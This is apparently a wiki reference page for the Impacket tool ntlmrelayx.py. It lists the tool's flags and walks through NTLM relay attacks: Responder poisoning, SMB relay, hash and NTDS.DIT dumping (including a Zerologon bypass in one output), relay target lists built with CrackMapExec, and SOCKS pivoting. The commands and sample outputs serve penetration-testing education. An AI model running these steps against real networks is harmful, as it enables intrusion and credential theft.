---
title : "ntlmrelayx.py"
# pre : ' '
description : "For every connection received, this module will try to relay that connection to specified target(s) system or the original client."
date : 2022-02-14T11:56:40+01:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## ntlmrelayx.py

For every connection received, this module will try to relay that connection to specified target(s) system or the original client.

## Installation

Install the [Impacket Framework]({{< ref "../" >}})

## Usage

```plain
ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w] [-i] [-ip INTERFACE_IP] [--no-smb-server] [--no-http-server] [--no-wcf-server] [--no-raw-server] [--smb-port SMB_PORT] [--http-port HTTP_PORT]
                     [--wcf-port WCF_PORT] [--raw-port RAW_PORT] [--no-multirelay] [-ra] [-r SMBSERVER] [-l LOOTDIR] [-of OUTPUT_FILE] [-codec CODEC] [-smb2support] [-ntlmchallenge NTLMCHALLENGE] [-socks]
                     [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6] [--remove-mic] [--serve-image SERVE_IMAGE] [-c COMMAND] [-e FILE] [--enum-local-admins] [-rpc-mode {TSCH}] [-rpc-use-smb]
                     [-auth-smb [domain/]username[:password]] [-hashes-smb LMHASH:NTHASH] [-rpc-smb-port {139,445}] [-q QUERY] [-machine-account MACHINE_ACCOUNT] [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN]
                     [-remove-target] [--no-dump] [--no-da] [--no-acl] [--no-validate-privs] [--escalate-user ESCALATE_USER] [--add-computer [COMPUTERNAME [PASSWORD ...]]] [--delegate-access] [--sid] [--dump-laps]
                     [--dump-gmsa] [--dump-adcs] [--add-dns-record NAME IPADDR] [-k KEYWORD] [-m MAILBOX] [-a] [-im IMAP_MAX] [--adcs] [--template TEMPLATE] [--altname ALTNAME] [--shadow-credentials]
                     [--shadow-target SHADOW_TARGET] [--pfx-password PFX_PASSWORD] [--export-type {PEM,PFX}] [--cert-outfile-path CERT_OUTFILE_PATH]
```

## Flags

```plain
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

Main options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -t TARGET, --target TARGET
                        Target to relay the credentials to, can be an IP, hostname or URL like domain\username@host:port (domain\username and port are optional, and don't forget to escape the '\'). If unspecified, it
                        will relay back to the client')
  -tf TARGETSFILE       File that contains targets by hostname or full URL, one per line
  -w                    Watch the target file for changes and update target list automatically (only valid with -tf)
  -i, --interactive     Launch an smbclient, LDAP console or SQL shell insteadof executing a command after a successful relay. This console will listen locally on a tcp port and can be reached with for example netcat.
  -ip INTERFACE_IP, --interface-ip INTERFACE_IP
                        IP address of interface to bind SMB and HTTP servers
  --smb-port SMB_PORT   Port to listen on smb server
  --http-port HTTP_PORT
                        Port(s) to listen on HTTP server. Can specify multiple ports by separating them with `,`, and ranges with `-`. Ex: `80,8000-8010`
  --wcf-port WCF_PORT   Port to listen on wcf server
  --raw-port RAW_PORT   Port to listen on raw server
  --no-multirelay       If set, disable multi-host relay (SMB and HTTP servers)
  -ra, --random         Randomize target selection
  -r SMBSERVER          Redirect HTTP requests to a file:// path on SMBSERVER
  -l LOOTDIR, --lootdir LOOTDIR
                        Loot directory in which gathered loot such as SAM dumps will be stored (default: current directory).
  -of OUTPUT_FILE, --output-file OUTPUT_FILE
                        base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute ntlmrelayx.py again with -codec and the corresponding codec
  -smb2support          SMB2 Support
  -ntlmchallenge NTLMCHALLENGE
                        Specifies the NTLM server challenge used by the SMB Server (16 hex bytes long. eg: 1122334455667788)
  -socks                Launch a SOCKS proxy for the connection relayed
  -wh WPAD_HOST, --wpad-host WPAD_HOST
                        Enable serving a WPAD file for Proxy Authentication attack, setting the proxy host to the one supplied.
  -wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM
                        Prompt for authentication N times for clients without MS16-077 installed before serving a WPAD file. (default=1)
  -6, --ipv6            Listen on both IPv6 and IPv4
  --remove-mic          Remove MIC (exploit CVE-2019-1040)
  --serve-image SERVE_IMAGE
                        local path of the image that will we returned to clients
  -c COMMAND            Command to execute on target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be in the same directory). For RPC no output will be provided.

  --no-smb-server       Disables the SMB server
  --no-http-server      Disables the HTTP server
  --no-wcf-server       Disables the WCF server
  --no-raw-server       Disables the RAW server

SMB client options:
  -e FILE               File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)
  --enum-local-admins   If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)

RPC client options:
  -rpc-mode {TSCH}      Protocol to attack, only TSCH supported
  -rpc-use-smb          Relay DCE/RPC to SMB pipes
  -auth-smb [domain/]username[:password]
                        Use this credential to authenticate to SMB (low-privilege account)
  -hashes-smb LMHASH:NTHASH
  -rpc-smb-port {139,445}
                        Destination port to connect to SMB

MSSQL client options:
  -q QUERY, --query QUERY
                        MSSQL query to execute(can specify multiple)

HTTP options:
  -machine-account MACHINE_ACCOUNT
                        Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name
  -machine-hashes LMHASH:NTHASH
                        Domain machine hashes, format is LMHASH:NTHASH
  -domain DOMAIN        Domain FQDN or IP to connect using NETLOGON
  -remove-target        Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)

LDAP client options:
  --no-dump             Do not attempt to dump LDAP information
  --no-da               Do not attempt to add a Domain Admin
  --no-acl              Disable ACL attacks
  --no-validate-privs   Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks
  --escalate-user ESCALATE_USER
                        Escalate privileges of this user instead of creating a new one
  --add-computer [COMPUTERNAME [PASSWORD ...]]
                        Attempt to add a new computer account
  --delegate-access     Delegate access on relayed computer account to the specified account
  --sid                 Use a SID to delegate access rather than an account name
  --dump-laps           Attempt to dump any LAPS passwords readable by the user
  --dump-gmsa           Attempt to dump any gMSA passwords readable by the user
  --dump-adcs           Attempt to dump ADCS enrollment services and certificate templates info
  --add-dns-record NAME IPADDR
                        Add the <NAME> record to DNS via LDAP pointing to <IPADDR>

IMAP client options:
  -k KEYWORD, --keyword KEYWORD
                        IMAP keyword to search for. If not specified, will search for mails containing "password"
  -m MAILBOX, --mailbox MAILBOX
                        Mailbox name to dump. Default: INBOX
  -a, --all             Instead of searching for keywords, dump all emails
  -im IMAP_MAX, --imap-max IMAP_MAX
                        Max number of emails to dump (0 = unlimited, default: no limit)

AD CS attack options:
  --adcs                Enable AD CS relay attack
  --template TEMPLATE   AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`
  --altname ALTNAME     Subject Alternative Name to use when performing ESC1 or ESC6 attacks.

Shadow Credentials attack options:
  --shadow-credentials  Enable Shadow Credentials relay attack (msDS-KeyCredentialLink manipulation for PKINIT pre-authentication)
  --shadow-target SHADOW_TARGET
                        target account (user or computer$) to populate msDS-KeyCredentialLink from
  --pfx-password PFX_PASSWORD
                        password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)
  --export-type {PEM,PFX}
                        choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))
  --cert-outfile-path CERT_OUTFILE_PATH
                        filename to store the generated self-signed PEM or PFX certificate and key
```

## Examples

For every connection received, this module will try to relay that connection
to specified target(s) system or (by default) the original client

Start Responder.py and turn off HTTP and SMB server. Also start [PCredz]({{< ref "pcredz" >}}) in listening mode (`sudo python3 Pcredz -i eth0`).

```plain
$ sudo python3 Responder.py -I enp0s31f6
[...]
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
   WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
[...]
```

### Default config

By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM. It's recommended to use `-socks` so if authentication was succesful a socks connection is set up. This way you can use tooling thru for example ProxyChains.

```plain
$ sudo ntlmrelayx.py -smb2support -socks -of captured-hashes
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
[...]
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target smb://10.10.10.10
[*] Connecting to 10.10.10.10 NETLOGON service
[*] SMB Auth OK, successfully
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
```

### Targeted SMB

Start ntlmrelayx.py with the target system in place.

```plain
$ sudo ntlmrelayx.py -t 10.10.10.10 -smb2support -socks
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
[...]
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target dcsync://10.10.10.10
[*] Connecting to 10.10.10.10 NETLOGON service
[*] Netlogon Auth OK, successfully bypassed autentication using Zerologon after 1 attempts!
[*] offsec\Administrator successfully validated through NETLOGON
[*] NTLM Sign/seal key: cf65d6660ec15d940f687bde79572094[...]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
[...]
```

### Generate targetlist and attack

To use NTLMrelayx.py with a list of targets you want to relay to, first generate a list with [CrackMapExec]({{< ref "tools/framework/crackmapexec" >}}) by using the command below.

```plain
crackmapexec smb 192.168.10.0/24 --gen-relay-list targetlist
```

Then you can use the `-tf` flag with NTLMrelayx.py to use the targetlist created as input file.

### SOCKS

As described it is recommended to use `-socks` so if authentication was successful a socks connection is set up. This way you can use tooling thru for example ProxyChains.

```plain
ntlmrelayx> socks
Protocol    Target          Username            AdminStatus     Port
--------    ------          --------            -----------     ----
SMB         10.10.10.1      OFFSEC/JOHNDO       TRUE            445
SMB         10.10.10.2      OFFSEC/JOHNDO       FALSE           445
```

## URL List

- [Github.com - ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
